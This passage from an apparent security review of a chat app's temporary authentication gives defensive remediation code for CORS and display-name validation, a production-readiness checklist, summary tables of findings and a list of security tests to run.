app = cors(app, allow_origin=ALLOWED_ORIGINS)

# SocketIO CORS configuration
server = Baseweb(
  "roomz",
  settings={
    "main_template": "minimal.html",
    "cors_allowed_origins": ALLOWED_ORIGINS
  }
)
```

**Production Configuration**:
```python
# Environment-specific CORS
import os

ALLOWED_ORIGINS = os.environ.get('ALLOWED_ORIGINS', '').split(',')

if not ALLOWED_ORIGINS or ALLOWED_ORIGINS == ['']:
  if os.environ.get('ENV') == 'production':
    raise ValueError("ALLOWED_ORIGINS must be set in production")
  else:
    ALLOWED_ORIGINS = ['http://localhost:8000']
```

**Reference**:
- [OWASP A05:2025 - Security Misconfiguration](https://owasp.org/Top10/A05_2025-Security_Misconfiguration/)
- [OWASP CORS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html)

---

### LOW-3: Input Validation Insufficient

**OWASP Category**: A03:2025 - Injection
**STRIDE**: Tampering
**CVSS Score**: 2.9 (Low)

**Description**: Display name input not validated. Currently only message content is sanitized.

**Impact**:
- Malicious display names can be stored
- XSS via display name possible
- Log injection possible
- Data quality issues

**Current Code** (from `app/__init__.py`):
```python
# Current message sanitization
content = html.escape(content.strip())[:MAX_MESSAGE_LENGTH]
```

**Remediation**:

```python
import re
from typing import Optional

def validate_display_name(name: str) -> tuple[bool, Optional[str]]:
  """Validate display name.

  Requirements:
  - 1-50 characters
  - Alphanumeric, spaces, underscores, hyphens only
  - No control characters
  - Not empty after trim
  """
  if not name:
    return False, "Display name is required"

  name = name.strip()

  if len(name) < 1 or len(name) > 50:
    return False, "Display name must be 1-50 characters"

  # Only allow safe characters
  if not re.match(r'^[\w\s\-]+$', name):
    return False, "Display name can only contain letters, numbers, spaces, underscores, and hyphens"

  # No control characters
  if any(ord(c) < 32 for c in name):
    return False, "Display name contains invalid characters"

  # Sanitize for HTML display
  sanitized = html.escape(name)

  return True, sanitized


# In authentication handler
@app.route('/auth/login', methods=['POST'])
async def login():
  # ... existing code ...

  display_name = data.get('display_name', '')

  # Validate and sanitize display name
  is_valid, display_name = validate_display_name(display_name)
  if not is_valid:
    return jsonify({'error': display_name}), 400

  # ... continue with session creation ...
```

**Reference**:
- [OWASP A03:2025 - Injection](https://owasp.org/Top10/A03_2025-Injection/)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

---

## Security Requirements for Production

The temporary authentication in I2-001 is **NOT SUITABLE FOR PRODUCTION**. Before any production deployment, the following requirements must be met:

### Production Authentication Requirements

1. **Multi-Factor Authentication (MFA)**
   - Magic link authentication (email verification)
   - Optional: password fallback
   - Rate limiting on authentication attempts

2. **Secure Token Storage**
   - Use httpOnly, secure, SameSite cookies
   - Implement CSRF protection
   - Short-lived access tokens + refresh tokens

3. **Database Persistence**
   - Session storage in MongoDB
   - Session revocation capability
   - Audit trail of all authentication events

4. **Proper Identity Management**
   - Unique user identifiers (email-based)
   - User profiles
   - Session management per user

5. **Security Headers**
   - Content Security Policy (CSP)
   - CORS configuration
   - HTTP Strict Transport Security (HSTS)

6. **Monitoring and Alerting**
   - Failed authentication attempt logging
   - Anomaly detection
   - Real-time alerts for suspicious activity

### Production Checklist

- [ ] Replace shared secret with magic link authentication
- [ ] Migrate from localStorage to httpOnly cookies
- [ ] Implement MongoDB session storage
- [ ] Add rate limiting at infrastructure level (nginx/API gateway)
- [ ] Configure CSP and CORS
- [ ] Add HSTS header
- [ ] Implement logging and monitoring
- [ ] Add CAPTCHA for suspicious activity
- [ ] Conduct penetration testing
- [ ] Security review of all code

---

## Summary of Recommendations

### Must Fix Before I2-001 Implementation

| ID | Finding | Action |
|----|---------|--------|
| CRITICAL-1 | Hardcoded/shared secret | Use environment variables, validate on startup, implement rate limiting |
| CRITICAL-2 | localStorage storage | Implement mitigation (encryption + rotation) or use httpOnly cookies |

### Must Implement During I2-001

| ID | Finding | Action |
|----|---------|--------|
| HIGH-1 | Weak token generation | Use `secrets.token_urlsafe(32)`, store hash only |
| HIGH-2 | Missing WebSocket auth | Validate token on connect, include user info in messages |
| HIGH-3 | Brute force vulnerability | Implement rate limiting (5 attempts / 15 minutes) |
| MEDIUM-1 | No token expiration | 1-hour absolute timeout, 30-minute inactivity timeout |
| MEDIUM-2 | No token rotation | Implement refresh endpoint, auto-refresh on frontend |
| MEDIUM-3 | Session hijacking | IP/UA validation, session binding to WebSocket |

### Should Implement (Best Practice)

| ID | Finding | Action |
|----|---------|--------|
| LOW-1 | Missing CSP | Add Content-Security-Policy header |
| LOW-2 | Missing CORS | Configure allowed origins |
| LOW-3 | Input validation | Validate and sanitize display names |

---

## Security Testing Recommendations

Before marking I2-001 as complete, perform the following security tests:

1. **Authentication Tests**:
   - [ ] Verify shared secret is not in source code
   - [ ] Test rate limiting (5 attempts should trigger lockout)
   - [ ] Verify token format (43 characters, URL-safe)
   - [ ] Test token expiration (should fail after timeout)
   - [ ] Test token refresh functionality

2. **Session Tests**:
   - [ ] Verify session is invalidated on logout
   - [ ] Verify expired sessions are cleaned up
   - [ ] Test multiple sessions per user (should reject or limit)
   - [ ] Verify IP/UA validation (optional for I2-001)

3. **WebSocket Tests**:
   - [ ] Verify unauthenticated connections are rejected
   - [ ] Verify messages include authenticated user info
   - [ ] Test connection with invalid token
   - [ ] Test connection with expired token

4. **Input Validation Tests**:
   - [ ] Test XSS in display name (should be sanitized)
   - [ ] Test display name length limits
   - [ ] Test message content sanitization
   - [ ] Test with malicious inputs (SQL injection, XSS, etc.)

5. **Frontend Tests**:
   - [ ] Verify token is not visible in localStorage inspector
   - [ ] Test token storage/retrieval
   - [ ] Test automatic logout on token expiration
   - [ ] Test reconnection with valid token

---

## Conclusion

The I2-001 temporary authentication implementation has **significant security vulnerabilities** that must be addressed before implementation. The use of a shared secret and localStorage token storage are the most critical issues.

**Acceptable for Development Only**: This temporary authentication can be used for internal development and testing, provided:
1. The shared secret is properly managed (environment variables, not hardcoded)
2. Rate limiting is implemented
3. Token expiration is enforced
4. The application is not exposed to the public internet
5. All users understand this is a temporary, insecure authentication mechanism

**Not Acceptable for Production**: Before any production deployment, all critical and high findings must be addressed, and the authentication system must be replaced with proper magic link authentication (I5-001, I5-002).

---

## References

- [OWASP Top 10:2025](https://owasp.org/Top10/)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)
- [NIST SP 800-63B Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- [CWE-939: Improper Authorization](https://cwe.mitre.org/data/definitions/939.html)
- [Socket.IO Authentication](https://socket.io/docs/v4/middlewares/)